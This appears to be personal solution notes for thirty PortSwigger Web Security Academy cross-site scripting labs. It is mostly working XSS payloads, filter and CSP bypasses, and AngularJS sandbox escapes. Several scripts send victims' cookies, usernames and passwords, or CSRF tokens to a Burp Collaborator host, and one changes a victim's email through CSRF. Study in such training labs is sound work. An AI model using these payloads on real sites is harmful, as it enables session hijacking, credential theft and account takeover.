1.Reflected XSS into HTML context with nothing encoded

	 <script>alert(1)</script>

2. Reflected XSS into HTML context with most tags and attributes blocked
	
    With your browser proxying traffic through Burp Suite, use the search function in the lab.
    Send the resulting request to Burp Intruder.
    In Burp Intruder, in the Positions tab, click "Clear §".
    In the request template, replace the value of the search term with: <>
    Place the cursor between the angle brackets and click "Add §" twice, to create a payload position. The value of the search term should now look like: <§§>
    Visit the XSS cheat sheet and click "copy tags to clipboard".
    In Burp Intruder, in the Payloads tab, click "Paste" to paste the list of tags into the payloads list.
    Click "Start attack".
    When the attack completes, review the results. Note that all payloads caused an HTTP 400 response, except for the body payload, which caused a 200 response.
    Go back to the Positions tab in Burp Intruder.
    Replace your search term with: <body%20=1>
    Place the cursor before the = character and click "Add §" twice, to create a payload position. The value of the search term should now look like: <body%20§§=1>
    Visit the XSS cheat sheet and click "copy events to clipboard".
    In Burp Intruder, in the Payloads tab, click "Clear" to remove the previous payloads. Then click "Paste" to paste the list of attributes into the payloads list.
    Click "Start attack".
    When the attack completes, review the results. Note that all payloads caused an HTTP 400 response, except for the onresize payload, which caused a 200 response.

Go to the exploit server and paste the following code, replacing your-lab-id with your lab ID:

<iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=alert(document.cookie)%3E" onload=this.style.width='100px'>

Click "Store" and "Deliver exploit to victim". 

3. Reflected XSS into HTML context with all tags blocked except custom ones

	<script>
location = 'https://acc01fec1fdae4f480cb01c800d300eb.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script> 

<script>
location = 'https://acc01fec1fdae4f480cb01c800d300eb.web-security-academy.net/?search=<xss+id=x+onfocus=alert(document.cookie) tabindex=1>#x';
</script> 

4. Reflected XSS with event handlers and href attributes blocked

	https://aca91fd51e2c993d802a6dcf003f00c3.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E 

	just connect with the url of home page
	?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E 

?search=<svg><a><animate+attributeName=href+values=javascript:alert(1)+/><text+x= +y= >Click me</text></a>

5. Reflected XSS with some SVG markup allowed

	"><svg><discard =1 onbegin=alert(0)>
	?search=%22%3E%3Csvg%3E%3Cdiscard%20onbegin=alert(1)%3E 

6. Reflected XSS into attribute with angle brackets HTML-encoded

	if we use any <> signs then it will be encoded to &lt &gt which is call as html encryption
	now we need to bypass this

	"onmouseover="alert(1)

7. Stored XSS into anchor href attribute with double quotes HTML-encoded
	javascript:alert(1)

8. Reflected XSS in canonical link tag

	'accesskey='x'onclick='alert(1)

https://your-lab-id.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)

This sets the X key as an access key for the whole page. When a user presses the access key, the alert function is called.

To trigger the exploit on yourself, press one of the following key combinations:

    On Windows: ALT+SHIFT+X
    On MacOS: CTRL+ALT+X
    On Linux: Alt+X

9. Reflected XSS into a JavaScript string with single quote and backslash escaped

	</script><script>alert(1)</script>

10. Reflected XSS into a JavaScript string with angle brackets HTML encoded

	'-alert(0)-' or -alert(0)-

11. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

	when i input some thing with adfas'sdf then it converts to 'adfas\'sdf'; to bypass i used
	\'-alert(1)// payload then the xss worked for me and the response was 

	var searchTerms = '\\'-alert(1)//';
	
12. Reflected XSS in a JavaScript URL with some characters blocked

https://your-lab-id.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27

The lab will be solved, but the alert will only be called if you click "Back to blog" at the bottom of the page.

The exploit uses exception handling to call the alert function with arguments. The throw statement is used, separated with a blank comment in order to get round the no spaces restriction. The alert function is assigned to the onerror exception handler. As throw is a statement, it cannot be used as an expression. Instead, we need to use arrow functions to create a block so that the throw statement can be used. We then need to call this function, so we assign it to the toString property of window and trigger this by forcing a string conversion on window. 

13. Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped



    Post a comment with a random alphanumeric string in the "Website" input, then use Burp Suite to intercept the request and send it to Burp Repeater.
    Make a second request in the browser to view the post and use Burp Suite to intercept the request and send it to Burp Repeater.
    Observe that the random string in the second Repeater tab has been reflected inside an onclick event handler attribute.
    Repeat the process again but this time modify your input to inject a JavaScript URL that calls alert, using the following payload: http://foo?&apos;-alert(1)-&apos;
    Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in your browser. Clicking the name above your comment should trigger an alert.



14. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped



    Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.
    Observe that the random string has been reflected inside a JavaScript template string.
    Replace your input with the following payload to execute JavaScript inside the template string: ${alert(1)}
    Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in your browser. When you load the page it should trigger an alert.


			<script>
                            var message = `0 search results for '${alert(1)}'`;
                            document.getElementById('searchMessage').innerText = message;
                        </script>

15. Reflected XSS with AngularJS sandbox escape without strings

	?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1 

	?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.(x=alert(1))=1


16. Reflected XSS with AngularJS sandbox escape and CSP

	<script>
location='https://ac041f641f5f7a1b803d2b41002f0037.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script> 

17. Stored XSS into HTML context with nothing encoded

	"><svg onload=alert(1)>

18. DOM XSS in document.write sink using source location.search

	

    On the product pages, notice that the dangerous JavaScript extracts a storeId parameter from the location.search source. It then uses document.write to create a new option in the select element for the stock checker functionality.
    Add a storeId query parameter to the URL and enter a random alphanumeric string as its value. Request this modified URL.
    In your browser, notice that your random string is now listed as one of the options in the drop-down list.
    Right-click and inspect the drop-down list to confirm that the value of your storeId parameter has been placed inside a select element.
    Change the URL to include a suitable XSS payload inside the storeId parameter as follows:
    product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>



19. DOM XSS in document.write sink using source location.search inside a select element

	 product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)> 

20. DOM XSS in innerHTML sink using source location.search

	

    Enter the following into the into the search box: <img src=1 onerror=alert(1)>
    Click "Search".

21. DOM XSS in jQuery anchor href attribute sink using location.search source

			<div class="is-linkback">
                            <a id="backLink" href="https://bing.com">Back</a>
                        </div>

	

22. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

	

    Enter a random alphanumeric string into the search box.
    View the page source and observe that your random string is enclosed in an ng-app directive.
    Enter the following AngularJS expression in the search box: {{$on.constructor('alert(1)')()}}
    Click search



23. Reflected DOM XSS

	\"-alert(1)}//

24. Stored DOM XSS

 <><img src=1 onerror=alert(1)>

In an attempt to prevent XSS, the website uses the JavaScript replace() function to encode angle brackets. However, when the first argument is a string, the function only replaces the first occurrence. We exploit this vulnerability by simply including an extra set of angle brackets at the beginning of the comment. These angle brackets will be encoded, but any subsequent angle brackets will be unaffected, enabling us to effectively bypass the filter and inject HTML.

The value of the src attribute is invalid and throws an error. This triggers the onerror event handler, which then calls the alert() function. As a result, the payload is executed whenever the user's browser attempts to load the page containing your malicious post. 

25. Exploiting cross-site scripting to steal cookies

 Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.

Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:

<script>
fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>

This script will make anyone who views the comment issue a POST request to burpcollaborator.net containing their cookie.

Go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again.

You should see an HTTP interaction. Take a note of the value of the victim's cookie in the POST body.

Then reload the main blog page, using Burp Proxy or Burp Repeater to replace your own cookie with the captured value. You should see an "Hello, admin" message within the response, demonstrating that you have successfully hijacked the admin user's session. 
	SESSION:EmAD7qgi0tjZnVk3Q18315FPtsO2QRxg

26. Exploiting cross-site scripting to capture passwords

 Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:

<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">

This script will make anyone who views the comment issue a POST request to burpcollaborator.net containing their username and password.

Go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again.

You should see an HTTP interaction. Take a note of the value of the victim's username and password in the POST body.

Use the credentials to log in as the victim user. 

	from burp collaborator u can find many important things like username pass and session id api key

27. Exploiting XSS to perform CSRF

Log in using the credentials provided and navigate to the email settings page.

If you view the source, you'll see the following information:

    You need to issue a POST request to /email, with a parameter also called email.
    There's an anti-CSRF token in a hidden input called token.

This means your exploit will need to load the email settings page, extract the CSRF token, and then use the token to change the victim's email address.

Submit the following payload in a blog comment:

<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/email/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>

This will make anyone who views the comment issue a POST request to change their email address to test@test.com.

28. Reflected XSS protected by CSP, with dangling markup attack


 Log in to the lab using the account provided above.
Examine the change email function. Observe that there is an XSS vulnerability in the email parameter.
Go to the Burp menu and launch the Burp Collaborator client.
Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
Back in the lab, go to the exploit server and add the following code, replacing your-lab-id with your lab ID, and replacing your-collaborator-id with the payload that you just copied from Burp Collaborator.
<script>
location='https://your-lab-id.web-security-academy.net/email?email=%22%3E%3Ctable%20background=%27//your-collaborator-id.burpcollaborator.net?';
</script>
Click "Store" and then "Deliver exploit to victim". If the target user visits the website containing this malicious script while they are still logged in to the lab website, their browser will send a request containing their CSRF token to your malicious website. You can then steal this token using the Burp Collaborator client.
Go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see an HTTP interaction that was initiated by the application. Select the HTTP interaction, go to the request tab, and copy the user's CSRF token.
With Burp's Intercept feature switched on, go back to the change email function of the lab and submit a request to change the email to any random address.
In Burp, go to the intercepted request and change the value of the email parameter to hacker@evil-user.net.
Right-click on the request and, from the context menu, select "Engagement tools" and then "Generate CSRF PoC". The popup shows both the request and the CSRF HTML that is generated by it. In the request, replace the CSRF token with the one that you stole from the victim earlier.
Click "Options" and make sure that the "Include auto-submit script" is activated.
Click "Regenerate" to update the CSRF HTML so that it contains the stolen token, then click "Copy HTML" to save it to your clipboard.
Go back to the exploit server and paste the CSRF HTML into the body. You can overwrite the script that we entered earlier.
Click "Store" and "Deliver exploit to victim". The user's email will be changed to hacker@evil-user.net


	<script>
location='https://your-lab-id.web-security-academy.net/email?email=%22%3E%3Ctable%20background=%27//your-collaborator-id.burpcollaborator.net?';
</script>


<script>
location='https://https://ac911f261f97994e8085023700750029.web-security-academy.net/email?email=%22%3E%3Ctable%20background=%27//alzke9klk6wxg7evz5lkankjsay0mp.burpcollaborator.net?';
</script>


29. Reflected XSS protected by very strict CSP, with dangling markup attack

	enter your credial then go to exploit server and paste this there

	<script>
if(window.name) {
    new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
    } else {
        location = 'https://your-lab-id.web-security-academy.net/email?email=%22%3E%3Ca%20href=%22https://your-exploit-server-id.web-security-academy.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
}
</script> 

	

30. Reflected XSS protected by CSP, with CSP bypass

?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
